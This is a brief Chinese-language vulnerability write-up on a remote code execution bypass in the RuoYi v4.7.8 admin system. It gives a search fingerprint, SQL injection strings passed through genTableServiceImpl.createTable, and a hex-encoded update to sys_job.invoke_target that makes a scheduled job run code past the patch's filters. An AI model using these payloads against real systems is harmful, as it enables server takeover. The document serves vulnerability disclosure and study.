# RUOYI-v4.7.8存在远程代码执行漏洞

- **系统**：若依　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="RuoYi"`

**请求体 / payload**
```
之前系统的定时任务存在漏洞，现在绕过了。
```

**其他**
- SQL: 在补丁中，采用了黑名单和白名单的策略。
不过，我通过使用白名单类成功绕过了它，并成功进行了 SQL 注入。
genTableServiceImpl.createTable('SELECT 1 FROM 'Hack By 1ue';')
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'Hack By 1ue' WHERE job_id = 1;')
修改表数据成功job_id
- RCE: JobInvokeUtil由于调用时字符串中不允许有括号，所以我将原作业表中特定作业的参数值修改为十六进制（绕过防御检测），从而启用了另一个远程代码执行（RCE）的定时任务
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6a61... WHERE job_id = 2;')
作业的 invoke_target 已更改
原地址：[https://github.com/luelueking/RuoYi-v4.7.8-RCE-POC?tab=readme-ov-file](https://github.com/luelueking/RuoYi-v4.7.8-RCE-POC?tab=readme-ov-file)